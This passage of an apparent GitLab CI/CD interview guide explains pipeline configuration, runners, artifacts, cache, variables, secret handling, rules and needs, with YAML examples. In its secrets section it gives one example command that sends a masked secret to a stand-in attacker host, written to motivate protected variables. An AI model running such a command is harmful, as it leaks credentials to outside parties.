- Top-level keys that aren't reserved words (`stages`, `default`, `variables`, `workflow`, `include` …) are **job names**.
- Each job needs at least a `script`. Most also set `stage`, and optionally `image`, `rules`, `artifacts`, `needs`.
- `default:` sets values (like `image`) inherited by every job unless the job overrides them.
- GitLab validates the file when a pipeline is created; syntax errors produce a failed pipeline with a "yaml invalid" message. The **pipeline editor** in the UI validates and shows the fully merged configuration.

**Example:**
```yaml
stages: [build, test, deploy]

default:
  image: python:3.13-slim

variables:
  PIP_CACHE_DIR: "$CI_PROJECT_DIR/.cache/pip"

build:
  stage: build
  script:
    - pip install build
    - python -m build            # creates dist/app-1.0.0-py3-none-any.whl
  artifacts:
    paths: [dist/]
    expire_in: 1 week

unit-tests:
  stage: test
  script:
    - pip install -r requirements.txt
    - pytest --junitxml=report.xml
  artifacts:
    reports:
      junit: report.xml          # shows test results in the MR

deploy-staging:
  stage: deploy
  script: ./deploy.sh staging dist/*.whl
  environment:
    name: staging
    url: https://staging.example.com
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
```

**What happens, step by step:**
1. A push to a feature branch: `deploy-staging`'s rule (branch is the default branch) is false, so the pipeline has only `build` and `unit-tests`.
2. `build` runs in a fresh `python:3.13-slim` container, creates `dist/app-1.0.0-py3-none-any.whl` and uploads `dist/` as an artifact kept for one week.
3. `unit-tests` runs in a new container (the build container is gone) and uploads `report.xml`; the MR shows "42 tests, 0 failed".
4. After merging to `main`, the rule is true, so `deploy-staging` is added. It downloads the `dist/` artifact from `build` and deploys it, and the staging environment page records the deployment.

**Common mistake → fix:** YAML indentation or a missing space after `-` (`-pytest`). The file either fails validation or the "command" becomes something unexpected. Fix: edit in the pipeline editor (it lints as you type) or validate with the CI Lint tool before pushing.

**Interview answer:** "It's the pipeline definition, versioned in the repo root. It declares stages and jobs; each job has a script and usually an image, plus optional rules, artifacts and needs. default holds shared settings. Because it lives with the code, each branch's pipeline matches its code, and I review pipeline changes in merge requests."

**Follow-ups:**
- *Can the file live elsewhere?* Yes, the CI/CD configuration file path is a project setting, and it can even point to a file in another project.

---

### Q15. What is a runner, and what is an executor?

**Short answer:** A **runner** is a program (GitLab Runner) installed on a machine you control or provided by GitLab, which asks GitLab for jobs, runs them, and sends back logs and results. The **executor** is the method the runner uses to run each job: in a fresh Docker container, a Kubernetes pod, an autoscaled VM, or directly on the host shell. Jobs pick runners by **tags**.

**How it works:**
1. A runner is registered with GitLab at instance, group or project level and has tags such as `docker`, `arm64`, `prod-deploy`.
2. It **polls** GitLab regularly ("any jobs for me?"). GitLab gives it a job whose `tags:` are all present on the runner.
3. The executor creates the isolated environment, the job runs, and the runner streams the log back.

| Executor | Isolation | Notes |
|---|---|---|
| `docker` | new container per job | most common; clean, reproducible environment |
| `kubernetes` | new pod per job (build container + service containers) | scales on an existing cluster |
| `docker-autoscaler` / `instance` | VMs created on demand | autoscaling; replaces the deprecated Docker Machine executor |
| `shell` | none: runs as a user on the host | simple but jobs share the machine (state and security leaks); in maintenance mode |

**Example:**
```yaml
deploy-prod:
  tags: [prod-deploy]          # only runners with this tag can take the job
  script: ./deploy.sh production
```

```flow
sequence: A runner takes the deploy-prod job
actors: GitLab, Runner, Container
Runner -> GitLab: any jobs for tags [docker, prod-deploy]?
GitLab --> Runner: job deploy-prod for commit 3f2a9c1, with a short-lived job token
Runner -> Container: start a fresh container from the job image
Container -> Container: clone 3f2a9c1, download artifacts, run ./deploy.sh production
Container --> Runner: exit code 0
Runner --> GitLab: full log and status: success
```

**What happens, step by step:**
1. `deploy-prod` is queued with tag `prod-deploy`. Shared runners tagged only `docker` never receive it.
2. The production runner (tags `docker`, `prod-deploy`) polls and receives it, along with a `CI_JOB_TOKEN` that's valid only while the job runs.
3. The Docker executor starts a clean container, clones commit `3f2a9c1` and runs the script.
4. The script exits with 0, so the runner reports **success** and GitLab moves on to the next jobs.

**Common mistake → fix:** using a `shell` executor shared by several projects. One job can read another project's files or leave state behind that changes the next job's results. Fix: use Docker or Kubernetes executors for isolation, and a dedicated, **protected** runner (only runs jobs for protected branches and tags) for production deploys.

**Interview answer:** "A runner is the agent that polls GitLab for jobs and executes them; the executor defines the isolation: a container per job with Docker, a pod per job on Kubernetes, autoscaled VMs, or the bare shell. Jobs select runners by tags. I use container executors for isolation, autoscaling for cost, and protected, dedicated runners for production deployments."

**Follow-ups:**
- *GitLab-hosted vs self-managed runners?* Hosted runners need no maintenance; self-managed ones are needed for private network access, special hardware, or keeping workloads in your own cloud account.
- *Why poll instead of GitLab pushing jobs?* Runners can sit behind firewalls with only outbound access to GitLab.

---

### Q16. In what order do jobs run, and what happens when one fails?

**Short answer:** By default, **stages run in order** and **jobs in the same stage run in parallel**; a stage starts only when every job in the previous stage has succeeded. If a job fails, later stages don't start and the pipeline fails, unless the job has `allow_failure: true`. The `needs` keyword overrides stage order so a job can start as soon as its specific dependencies finish (see Q26).

**How it works:**
- Default job condition is `when: on_success`: run only if all jobs in earlier stages succeeded.
- `when: on_failure` runs only if something earlier failed (e.g. a notification); `when: always` runs regardless (e.g. cleanup).
- `allow_failure: true` lets a job fail with a warning (orange) without blocking the pipeline.

**Example:**
```yaml
stages: [build, test, deploy]
build-api:   { stage: build,  script: make api }
build-web:   { stage: build,  script: make web }
test-api:    { stage: test,   script: make test-api }
test-web:    { stage: test,   script: make test-web }
deploy:      { stage: deploy, script: make deploy }
notify-fail: { stage: deploy, script: ./notify.sh "pipeline failed", when: on_failure }
```

```flow
trace: Stage order when test-web fails
build stage: **build-api** and **build-web** run in parallel > Both pass after 3 and 5 minutes. The test stage waits for the slower one.
test stage: test-api passes, **test-web fails** > The stage is marked failed because one job failed without allow_failure.
deploy stage: deploy is **skipped** > deploy has the default when on_success, and an earlier job failed.
deploy stage: notify-fail **runs** > when on_failure means it runs only because something failed.
pipeline: **failed** > The merge request shows the failure, and test-web's log explains why.
```

**What happens, step by step:**
1. `build-api` (3 min) and `build-web` (5 min) run together. The test stage starts at minute 5, when both are done.
2. `test-api` passes; `test-web` fails with exit code 1.
3. `deploy` is skipped because an earlier job failed; `notify-fail` runs because of `when: on_failure`.
4. Pipeline status: failed. Fix the test and push again for a new pipeline, or click retry on `test-web` if it was a flaky failure.

**Common mistake → fix:** adding `allow_failure: true` to a flaky test job "to unblock the team". Now real failures also turn orange and get ignored. Fix: quarantine the specific flaky test with an owner and deadline (see Q51) and keep the job blocking.

**Interview answer:** "Stages run sequentially, jobs within a stage in parallel, and by default a job runs only if everything in earlier stages succeeded. A failure stops later stages and fails the pipeline unless the job is allow_failure. when: on_failure and always handle notifications and cleanup, and needs lets me break out of strict stage ordering."

**Follow-ups:**
- *What are `.pre` and `.post`?* Built-in stages that always run first and last, regardless of the order in `stages:`.

---

### Q17. What do `image` and `services` do?

**Short answer:** **`image`** is the Docker image the job's commands run inside, so it decides which tools are available (`python:3.13-slim` gives you Python, `node:22` gives you Node). **`services`** starts extra containers alongside the job, such as a PostgreSQL or Redis database for integration tests, reachable by a hostname. Both only work with container-based executors (Docker, Kubernetes).

**How it works:**
1. The runner pulls the job's image and starts a container from it.
2. For each service, it starts another container from that image, on a network the job can reach. The hostname is derived from the image name (`postgres:17` → `postgres`) or set with `alias`.
3. The job's `script` runs inside the main container; it talks to services over the network.
4. When the job ends, all containers are removed, so every run starts with an empty database.

**Example:**
```yaml
integration-tests:
  image: python:3.13-slim
  services:
    - name: postgres:17
      alias: db
  variables:
    POSTGRES_DB: shop_test
    POSTGRES_USER: runner
    POSTGRES_PASSWORD: test-only-password
    DATABASE_URL: postgresql://runner:test-only-password@db:5432/shop_test
  script:
    - pip install -r requirements.txt
    - pytest tests/integration
```

**What happens, step by step:**
1. The runner starts the `postgres:17` container with `POSTGRES_DB=shop_test` etc. (job variables are passed to services too), reachable as `db`.
2. It starts the `python:3.13-slim` container and runs the script.
3. Tests connect to `db:5432` and create tables in an empty `shop_test` database.
4. The job ends; both containers are destroyed. The next pipeline gets a fresh database, so tests can't depend on leftovers.

**Common mistake → fix:** connecting to `localhost:5432`. The database runs in a **separate** container, so localhost is the job's own container and the connection is refused. Fix: use the service hostname (`db` here, or `postgres` without an alias). A second mistake is tests starting before Postgres is ready; add a short wait loop (`until pg_isready -h db; do sleep 1; done`) if needed.

**Interview answer:** "image chooses the container the job runs in, so it defines the toolchain; services start sidecar containers like Postgres or Redis that the job reaches by hostname. Each job gets fresh containers, which keeps integration tests reproducible. I pin image versions so the pipeline doesn't change underneath me."

**Follow-ups:**
- *`latest` tag for images?* Avoid it: the image can change between runs without any commit. Pin a version, or a digest for full reproducibility.
- *How do you build Docker images inside a job?* See Q40 (Docker-in-Docker service or rootless builders like BuildKit).

---

### Q18. `before_script`, `script` and `after_script`: when does a job pass or fail?

**Short answer:** A job's commands run in three parts: `before_script` (setup), `script` (the main work) and `after_script` (cleanup, which runs **even if the job failed**). A job **passes** if every command in `before_script` and `script` exits with code 0; the **first** command that returns a non-zero exit code stops the job and marks it failed. `after_script` runs in a separate shell, and its failures don't change the job result.

**How it works:**
- `before_script` and `script` are joined and run in one shell, so variables and `cd` carry over between lines.
- The runner checks each command's exit code. Non-zero means "stop, job failed".
- In a multi-line command (`|` block), only the shell's normal rules apply: a failing command in the middle of a pipe (`cmd | tee log`) may not stop the job unless you `set -o pipefail`.
- `after_script` runs afterwards in a new shell (exported variables from `script` are gone) and has its own timeout (5 minutes by default).

**Example:**
```yaml
unit-tests:
  image: python:3.13-slim
  before_script:
    - pip install -r requirements.txt
  script:
    - echo "Running tests for $CI_COMMIT_SHORT_SHA"
    - pytest -q | tee pytest.log
    - echo "done"
  after_script:
    - echo "cleanup, job status was $CI_JOB_STATUS"
```

**What happens, step by step:**
1. `pip install` exits 0; setup succeeded.
2. `echo` prints `Running tests for 3f2a9c1`.
3. `pytest -q` finds 2 failing tests and exits with 1, **but** it's piped into `tee`, which exits 0. In a plain shell the pipe's exit code is the last command's, so the job continues and prints "done".
4. The job **passes** with failing tests. That's a real bug.
5. `after_script` prints `cleanup, job status was success`.

**Fix:**
```yaml
  script:
    - set -o pipefail            # a pipe fails if any command in it fails
    - pytest -q | tee pytest.log
```
Now step 3 exits 1, the job stops before "done", it's marked **failed**, and `after_script` prints `job status was failed`.

**Common mistake → fix:** relying on `after_script` to fail the job (e.g. a final check there). Its failure is ignored. Fix: put checks in `script`; use `after_script` only for cleanup and diagnostics.

**Interview answer:** "before_script and script run in one shell, and the first non-zero exit code fails the job; after_script runs afterwards in a separate shell even on failure, and can't change the result. A classic trap is piping a test command into tee, which hides the failure; set -o pipefail fixes that."

**Follow-ups:**
- *Can a job be allowed to fail only for certain codes?* Yes: `allow_failure: { exit_codes: [137] }` (see Q32).

---

### Q19. What are artifacts?

**Short answer:** **Artifacts** are files a job saves and uploads to GitLab when it finishes, such as build output (`dist/`), test reports or a Terraform plan. Later jobs in the same pipeline download them automatically, and people can download them from the UI. Since every job starts in a clean container, artifacts are **the** reliable way to pass files between jobs.

**How it works:**
1. `artifacts:paths` lists files or folders to upload after the script finishes (by default only if the job succeeded; `artifacts:when: always` uploads on failure too, useful for logs).
2. Jobs in later stages download artifacts from all earlier jobs by default. With `needs`, a job downloads only from the jobs it needs; `dependencies: []` downloads nothing.
3. `expire_in` sets how long they're kept (otherwise the instance default, 30 days by default).
4. `artifacts:reports` are special files GitLab understands: JUnit test results, coverage, security scan results, `dotenv` variables. They appear in the MR.

**Example:**
```yaml
build:
  stage: build
  script: npm ci && npm run build      # writes dist/index.html, dist/app.3f2a.js
  artifacts:
    paths: [dist/]
    expire_in: 1 week

e2e-tests:
  stage: test
  script: npx playwright test
  artifacts:
    when: always
    paths: [playwright-report/]
    reports:
      junit: results.xml
```

**What happens, step by step:**
1. `build` finishes; the runner zips `dist/` (say 4 MB) and uploads it to GitLab.
2. `e2e-tests` starts on a different runner in a new container. Before its script runs, it downloads and unzips `dist/`, so the files are exactly what `build` produced.
3. Two tests fail. Because of `when: always`, `playwright-report/` is still uploaded, and you can open the HTML report from the job page.
4. `results.xml` is parsed; the MR widget shows "2 failed" with the test names.
5. After a week, `dist/` is deleted automatically.

**Common mistake → fix:** putting secrets in artifacts (for example a generated `.env` or `kubeconfig`). Anyone who can view the pipeline can usually download artifacts. Fix: never write secrets to artifact paths; pass non-secret values with a `dotenv` report and fetch secrets inside the job that needs them.

**Interview answer:** "Artifacts are files a job uploads when it finishes, and later jobs in the same pipeline download them, which is how build output, test reports and Terraform plans move between isolated jobs. I set expire_in to control storage, use when: always for diagnostic output, use reports so results show up in the MR, and never put secrets in them."

**Follow-ups:**
- *What's a `dotenv` report?* A file of `KEY=value` lines that become variables in later jobs, e.g. passing `IMAGE_DIGEST` from build to deploy.

---

### Q20. What is cache, and how is it different from artifacts?

**Short answer:** **Cache** stores files that make jobs faster, like downloaded dependencies, and reuses them **across pipelines**. It's **best effort**: it may be missing (new runner, expired, different key) and the job must still work without it. **Artifacts** pass **results** between jobs in the same pipeline and are guaranteed. Rule: cache for speed, artifacts for correctness.

**How it works:**

| | Artifacts | Cache |
|---|---|---|
| Purpose | pass outputs to later jobs, keep reports | speed up jobs by reusing downloads |
| Scope | this pipeline (and downloadable) | across pipelines, by `key` |
| Guarantee | reliable | best effort, may be empty |
| Stored | on GitLab | on the runner or in shared object storage (S3, GCS) |
| Example | `dist/`, `report.xml`, `plan.tfplan` | `.npm/`, `.cache/pip`, `.cache/uv` |

The cache `key` decides which cache a job uses. `key: files: [package-lock.json]` builds the key from the lockfile's content, so a dependency change gives a new, clean cache. `policy: pull` downloads but never uploads (faster); the default `pull-push` does both.

**Example:**
```yaml
.npm-cache:
  cache:
    key:
      files: [package-lock.json]
    paths: [.npm/]

install:
  extends: .npm-cache
  script: npm ci --cache .npm --prefer-offline

lint:
  extends: .npm-cache
  cache:
    policy: pull          # extends deep-merges hashes, so key and paths are kept
  script: npm ci --cache .npm --prefer-offline && npm run lint
```

**What happens, step by step:**
1. First pipeline: no cache exists for this lockfile's key. `npm ci` downloads 900 packages in 90 seconds; the job uploads `.npm/` under the key derived from `package-lock.json`.
2. Next pipeline, same lockfile: the cache is restored, `npm ci` uses the local copies and takes 15 seconds. `lint` only pulls.
3. Someone adds a dependency, so `package-lock.json` changes and the key changes. The first job downloads again and saves a new cache.
4. If the cache is missing (e.g. a new autoscaled runner without shared cache), the job is just slower, never wrong.

**Common mistake → fix:** using cache to pass `dist/` from `build` to `deploy`. If the deploy job runs on a runner without that cache, it deploys nothing or old files. Fix: artifacts for build output. Also avoid caching `node_modules/` across lockfile changes without a lockfile-based key; it causes "works in CI, not locally" bugs.

**Interview answer:** "Artifacts are job outputs passed reliably to later jobs in the same pipeline; cache is a best-effort speed-up reused across pipelines, keyed by something like the lockfile so it invalidates when dependencies change. A job must be correct with an empty cache. I use pull-only policies for most jobs and configure distributed cache in object storage for autoscaled runners."

**Follow-ups:**
- *Why is my cache never hit on autoscaled runners?* The cache is local to each runner by default; configure a shared (distributed) cache in S3 or GCS.

---

### Q21. What is a CI/CD variable, and where do values come from?

**Short answer:** A **CI/CD variable** is a named value that GitLab passes to a job as an environment variable, like `DEPLOY_TARGET=staging`. Some are **predefined** by GitLab (`CI_COMMIT_SHA`, `CI_COMMIT_BRANCH`, `CI_PIPELINE_SOURCE`, `CI_REGISTRY_IMAGE` …); others you define in `.gitlab-ci.yml` or in project, group or instance settings. If the same name is defined in several places, a fixed **precedence** order decides which value wins.

**How it works (precedence, highest first, simplified from the GitLab docs):**
1. Manual job variables and pipeline variables (run-pipeline form, schedule, API, trigger, upstream pipeline).
2. Project variables, then group variables (closest subgroup wins), then instance variables.
3. Variables from `dotenv` reports of jobs listed in `needs`/`dependencies`.
4. Variables in `.gitlab-ci.yml`: `rules:variables`, then job `variables`, then `workflow:rules:variables`, then top-level `variables`.
5. Deployment variables, then predefined variables (lowest).

Variables are also usable in `rules: if:` expressions to decide whether jobs run.

**Example:** project setting `DEPLOY_TARGET=production`, and:
```yaml
variables:
  DEPLOY_TARGET: "staging"

deploy:
  variables:
    DEPLOY_TARGET: "review"
  script:
    - echo "Deploying $CI_COMMIT_SHORT_SHA to $DEPLOY_TARGET"
```

**What happens, step by step:**
1. Normal push: the project variable outranks both YAML values → prints `Deploying 3f2a9c1 to production`.
2. Delete the project variable: the job-level value outranks the top-level one → `Deploying 3f2a9c1 to review`.
3. Run the pipeline manually with `DEPLOY_TARGET=canary`: pipeline variables outrank project variables → `Deploying 3f2a9c1 to canary`.
4. `CI_COMMIT_SHORT_SHA` is predefined: the first 8 characters of the commit ID.

**Common mistake → fix:** surprise values because a group-level variable with the same name silently overrides your YAML default. Fix: check the variable sources (Settings → CI/CD → Variables at project and group level), print non-secret values in the job, and use distinct names. For values a person chooses when starting a pipeline, prefer typed **inputs** (Q35), which can't be overridden this way.

**Interview answer:** "CI/CD variables are environment variables injected into jobs. GitLab predefines many, like CI_COMMIT_SHA and CI_PIPELINE_SOURCE, and I can define more in YAML or in project, group and instance settings. Precedence matters: pipeline and manual variables beat project and group settings, which beat values in the YAML file, which beat predefined ones. I use them both inside scripts and in rules expressions."

**Follow-ups:**
- *Are variables expanded in all keywords?* Not all; GitLab documents where variables can be used (e.g. in `image`, `rules:if`, `environment:name`), and some are expanded by GitLab, others by the runner's shell.

---

### Q22. How do you handle secrets in CI/CD variables (masked, hidden, protected, file)?

**Short answer:** Secrets stored as GitLab variables should use the protection flags: **masked** (the value is replaced with `[MASKED]` in job logs), **masked and hidden** (also can't be viewed in the settings UI after saving), **protected** (only available to pipelines on protected branches or tags, so a random feature branch can't read it), and **environment scope** (only jobs deploying to, say, `production` get it). Better still: avoid long-lived secrets entirely with OIDC (Q39) or fetch them at runtime from a secrets manager.

**How it works:**
- Masking needs a value that is one line, no spaces, at least 8 characters. It only hides the exact string in logs: `echo $TOKEN | base64` prints it in another form.
- "Masked and hidden" can only be chosen when creating the variable.
- **File** type variables write the value to a temporary file and put the file's **path** in the variable, for tools that need a file (`kubeconfig`, certificates).
- The `secrets:` keyword (Premium/Ultimate) fetches values from HashiCorp Vault, Azure Key Vault, Google Secret Manager or GitLab's own secrets manager at job time.

**Example:** variable `PROD_DB_PASSWORD`, flags: masked and hidden, protected, environment scope `production`.
```yaml
migrate-prod:
  stage: deploy
  environment: production
  script: ./migrate.sh            # reads $PROD_DB_PASSWORD
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH   # main is a protected branch
```

**What happens, step by step:**
1. Pipeline on `main` (protected), job environment `production`: the job receives the password. If the script accidentally echoes it, the log shows `[MASKED]`.
2. Pipeline on `feature/x` (unprotected): the variable is **not injected at all**, even if someone edits the job to print it; they get an empty string.
3. A job on `main` with `environment: staging` doesn't get it either, because of the environment scope.
4. Nobody can reveal the value in Settings; to change it, you replace it.

**Common mistake → fix:** relying on masking alone. A branch pipeline can still exfiltrate an unprotected masked variable (`curl -d "$SECRET" https://evil.example`); masking only affects the log. Fix: mark deploy secrets **protected**, restrict who can push to protected branches, and prefer OIDC short-lived credentials over stored keys.

**Interview answer:** "I store secrets as masked-and-hidden, protected, environment-scoped variables, so they never show in logs or the UI, and only protected-branch jobs deploying to that environment receive them. Masking is cosmetic protection for logs; the real control is protected variables plus who can push to protected branches. For cloud access I prefer OIDC so there's nothing long-lived to steal, and app secrets come from a secrets manager at runtime."

**Follow-ups:**
- *Why does masking fail for my JSON key?* It's multi-line or contains characters masking doesn't support; store it as a file variable or in a secrets manager.

---

### Q23. What kinds of pipelines are there, and what is `CI_PIPELINE_SOURCE`?

**Short answer:** GitLab creates pipelines for different **events**, and the predefined variable **`CI_PIPELINE_SOURCE`** tells you which one: `push` (branch or tag pushed), `merge_request_event` (MR pipeline), `schedule` (cron-like schedule), `web` (Run pipeline button), `api`, `trigger`, `parent_pipeline` (child pipeline), `pipeline` (multi-project). Rules use it to run the right jobs for each event, for example nightly tests only on schedules.

**How it works:**
- **Branch pipeline:** push to a branch; `CI_COMMIT_BRANCH` is set.
- **Tag pipeline:** push a tag; `CI_COMMIT_TAG` is set and `CI_COMMIT_BRANCH` isn't. Often used to publish releases.
- **Merge request pipeline:** runs in the context of an MR; `CI_MERGE_REQUEST_*` variables are set (Q24).
- **Scheduled pipeline:** configured under Build → Pipeline schedules with a cron expression and optional variables.

**Example:**
```yaml
nightly-full-tests:
  script: make test-all            # 40 minutes
  rules:
    - if: $CI_PIPELINE_SOURCE == "schedule"

publish-release:
  script: ./publish.sh "$CI_COMMIT_TAG"
  rules:
    - if: $CI_COMMIT_TAG =~ /^v\d+\.\d+\.\d+$/
```

**What happens, step by step:**
1. A schedule set to `0 2 * * *` creates a pipeline at 02:00 every night with `CI_PIPELINE_SOURCE=schedule`; `nightly-full-tests` is included.
2. A normal push has `CI_PIPELINE_SOURCE=push`; the nightly job's rule is false, so it's not added, keeping push pipelines fast.
3. Pushing tag `v1.4.2` creates a tag pipeline: `CI_COMMIT_TAG=v1.4.2` matches the regex, so `publish-release` runs `./publish.sh v1.4.2`.
4. Pushing tag `test-123` doesn't match, so nothing is published.

**Common mistake → fix:** a deploy rule `if: $CI_COMMIT_BRANCH == "main"` that you also expect to run on release tags. Tag pipelines have no `CI_COMMIT_BRANCH`, so the job never runs. Fix: add a separate rule for `$CI_COMMIT_TAG`.

**Interview answer:** "Pipelines are created for pushes to branches and tags, merge requests, schedules, manual runs, API calls, triggers and parent or upstream pipelines; CI_PIPELINE_SOURCE tells the job which. I use it in rules: heavy suites only on schedules, releases only on semver tags, and MR-specific jobs only for merge_request_event."

**Follow-ups:**
- *What does a scheduled pipeline run against?* The branch or tag chosen in the schedule, using that ref's `.gitlab-ci.yml`.

---

### Q24. Merge request pipelines, merged results pipelines and merge trains

**Short answer:** A **merge request pipeline** runs for an MR's source branch and has MR details available (`CI_MERGE_REQUEST_IID`, target branch …). A **merged results pipeline** tests what `main` would look like **after** the merge (source merged into the latest target), catching "passes on my branch, breaks on main". A **merge train** queues MRs and tests each one on top of the ones ahead of it, so `main` stays green even when many MRs merge the same hour.

**How it works:**
- MR pipelines need rules that include `merge_request_event` (otherwise jobs run only as branch pipelines).
- Merged results pipelines are enabled in project settings; GitLab creates a temporary merge commit and tests it.
- Merge trains: clicking "Merge" adds the MR to the train. Each MR's pipeline tests `main + every MR ahead of it + this MR`, in parallel. If one fails, it's removed and the pipelines behind it restart without it.

**Example:** three MRs are approved at 10:00 and added to the train in order !41, !42, !43.

```flow
trace: A merge train with three merge requests
queue: !41, !42, !43 added in that order > Each merge request will be tested on top of everything ahead of it.
pipelines start in parallel: main+!41, main+!41+!42, main+!41+!42+!43 > Three pipelines run at the same time, each testing a combined result.
main+!41 passes: **!41 merged** > The first car is safe to merge because its exact combination was tested.
main+!41+!42 fails: **!42 removed** > !42 conflicts with !41 in a way that only shows up when combined.
!43 restarts as main+!41+!43 and passes: **!43 merged** > The car behind is re-tested without the failed one. main never received a broken combination.
```

**What happens, step by step:**
1. Three pipelines start at once, each testing a different combination.
2. !41's pipeline passes, so !41 is merged.
3. !42's pipeline fails: !42 and !41 changed related code; each passed alone, but together they break. !42 is removed from the train, and its author is notified.
4. !43's pipeline had included !42, so it restarts as `main + !41 + !43`, passes, and merges.
5. At no point did `main` contain the broken !41 + !42 combination.

**Common mistake → fix:** enabling MR pipelines without `workflow:rules`, so every push to a branch with an open MR creates **two** pipelines (a branch pipeline and an MR pipeline). Fix: the `workflow:rules` pattern in Q25 / Q54.

**Interview answer:** "MR pipelines run in the MR context; merged results pipelines test the merge of the source into the current target, so I'm testing what main will actually become; merge trains serialise merges while still running pipelines in parallel, each testing the MR on top of everything ahead of it. Together they keep main green even with many concurrent merges."

**Follow-ups:**
- *Cost of merge trains?* Failures cause restarts for the cars behind, so it works best with fast, reliable pipelines.

---
## 4. Controlling pipelines

### Q25. `rules` and `workflow:rules`

**Short answer:** **`workflow:rules`** decide whether a **pipeline is created at all** for an event. Job **`rules`** decide whether **each job is added** to the pipeline, and how (`when: on_success`, `manual`, `delayed`, `always` or `never`, plus optional `allow_failure` and `variables`). Rules are checked top to bottom and the **first match wins**; if no rule matches, the job is not added. `rules` replaced the older `only`/`except` keywords.

**How it works:**
- A rule can test `if:` (a variable expression), `changes:` (did these files change?), and `exists:` (does this file exist?). All conditions in one rule must be true.
- A matching rule without `when` means `when: on_success`.
- `when: never` in a rule is how you say "skip in this case"; put it first.
- `workflow:rules` accept only `when: always` or `when: never`.

**Example:**
```yaml
workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"   # 1. MR pipelines
    - if: $CI_COMMIT_BRANCH && $CI_OPEN_MERGE_REQUESTS
      when: never                                        # 2. no branch pipeline if an MR is open
    - if: $CI_COMMIT_BRANCH                              # 3. other branch pipelines
    - if: $CI_COMMIT_TAG                                 # 4. tag pipelines

frontend-tests:
  script: npm test
  rules:
    - if: $CI_PIPELINE_SOURCE == "schedule"
      when: never
    - changes: [frontend/**/*]
```

**What happens, step by step:**
1. Push to `feature/login` **with an open MR**: two events arrive. For the MR event, workflow rule 1 matches → pipeline created. For the branch push, rule 1 doesn't match, rule 2 matches (`when: never`) → no pipeline. Result: exactly one pipeline.
2. Push to `feature/login` **without an MR**: rule 3 matches → branch pipeline created.
3. In that pipeline, `frontend-tests`: not a schedule, so its first rule doesn't match; the second checks whether files under `frontend/` changed. Only `backend/api.py` changed → no rule matches → job **not added**.
4. A scheduled pipeline: the first job rule matches with `when: never` → job skipped.

**Common mistake → fix:** writing `rules: - changes: [frontend/**/*]` and expecting it to work on scheduled or tag pipelines. For pipelines without a push diff (schedules, tags, web), `changes` **always evaluates to true**, so the job always runs there. Fix: combine with `if:` conditions as above, or use `changes: compare_to: refs/heads/main` in MR pipelines.

**Interview answer:** "workflow:rules decide whether a pipeline exists; job rules decide whether each job is added and with what when. Rules are evaluated in order and the first match wins; no match means the job is skipped. I use if, changes and exists, put never-rules first, and use the CI_OPEN_MERGE_REQUESTS pattern in workflow rules to avoid duplicate branch and MR pipelines."

**Follow-ups:**
- *Can rules set variables?* Yes: `rules: - if: … variables: { DEPLOY_ENV: prod }`, which has higher precedence than job variables.
- *Can you mix `rules` with `only/except`?* No, not in the same job.

---

### Q26. `needs` and DAG pipelines

**Short answer:** **`needs`** lets a job start **as soon as the specific jobs it depends on finish**, instead of waiting for the whole previous stage. The pipeline becomes a **DAG** (directed acyclic graph: a network of "this depends on that" links with no loops). It shortens pipelines and also limits which artifacts are downloaded to just the needed jobs.

**How it works:**
- `needs: [build-web]` → start when `build-web` succeeds, regardless of other jobs in earlier stages.
- `needs: []` → start immediately when the pipeline starts.
- `needs: [{ job: build, artifacts: false }]` → wait for it but don't download its artifacts.
- A job can list up to 50 needs by default.

**Example:**
```yaml
stages: [build, test, deploy]
build-api:  { stage: build,  script: make api }          # 8 min
build-web:  { stage: build,  script: make web }          # 2 min
test-web:   { stage: test,   needs: [build-web], script: make test-web }   # 3 min
test-api:   { stage: test,   needs: [build-api], script: make test-api }   # 4 min
lint:       { stage: test,   needs: [], script: make lint }                # 1 min
deploy:     { stage: deploy, needs: [test-web, test-api, lint], script: make deploy }
```

```flow
trace: Timeline with needs (minutes from pipeline start)
minute 0: **lint**, build-api and build-web start > lint has needs [] so it doesn't wait for the build stage.
minute 2: build-web done, **test-web starts** > Without needs, test-web would wait for the slow build-api until minute 8.
minute 5: test-web done > The web path is finished while the api build is still running.
minute 8: build-api done, **test-api starts** > Each job waits only for what it actually uses.
minute 12: test-api done, **deploy starts** > deploy waits for all three checks. The end time matches the stage version here, but web and lint failures were reported many minutes earlier.
```

**What happens, step by step:**
1. Stage-only ordering: the test stage starts at minute 8 (after the slowest build), and lasts 4 minutes (the slowest test) → deploy at minute 12. Here it happens to be the same, but `test-web`'s result arrives at minute 5 instead of 11, so a web failure is reported 6 minutes earlier and `lint` failures after 1 minute instead of 9.
2. With more uneven paths (say `build-web` → `test-web` → `e2e-web` taking 15 minutes), `needs` lets the long path start immediately and the total time drops to the longest *chain*, not the sum of the slowest job in each stage.
3. `test-web` downloads only `build-web`'s artifacts, not `build-api`'s.

**Common mistake → fix:** adding `needs` to a deploy job but forgetting a check, e.g. `deploy: needs: [test-api]`. Deploy now starts while `test-web` is still running, and may ship broken web code. Fix: list **every** job that must pass before deploying (or don't use `needs` on the final gate).

**Interview answer:** "needs turns the pipeline into a DAG: a job starts as soon as the jobs it lists succeed, instead of waiting for the whole previous stage. That shortens total time to the longest dependency chain, gives faster failure feedback, and narrows artifact downloads. needs: [] starts a job immediately, which is good for lint. I'm careful that gate jobs like deploy list every required check."

**Follow-ups:**
- *Can `needs` reference a job in a later stage?* Jobs can need jobs in the same or earlier stages, and in recent versions even same-stage jobs; it can't create a cycle.
- *`needs` vs `dependencies`?* `dependencies` only controls artifact downloads; `needs` controls both order and artifacts.

---

### Q27. `parallel` and `parallel:matrix`

**Short answer:** **`parallel: N`** runs N copies of the same job at once; each copy gets `CI_NODE_INDEX` (1…N) and `CI_NODE_TOTAL` (N) so it can take its share of the work, typically a slice of a test suite. **`parallel:matrix`** runs one copy per **combination of variable values**, e.g. every service × every CPU architecture. Both are limited to 200 jobs.

**How it works:**
- With `parallel: 4`, GitLab creates jobs named `test 1/4` … `test 4/4`. Your test tool must use the index to pick its slice; GitLab doesn't split tests itself.
- With `matrix`, each list of values is multiplied: `SERVICE: [api, worker, agent]` × `ARCH: [amd64, arm64]` = 6 jobs, each with those variables set.

**Example:**
```yaml
test:
  parallel: 4
  script: pytest --splits $CI_NODE_TOTAL --group $CI_NODE_INDEX   # pytest-split plugin

build:
  parallel:
    matrix:
      - SERVICE: [api, worker, agent]
        ARCH: [amd64, arm64]
  tags: [$ARCH]                       # route arm64 jobs to arm64 runners
  script: ./build.sh $SERVICE $ARCH
```

**What happens, step by step:**
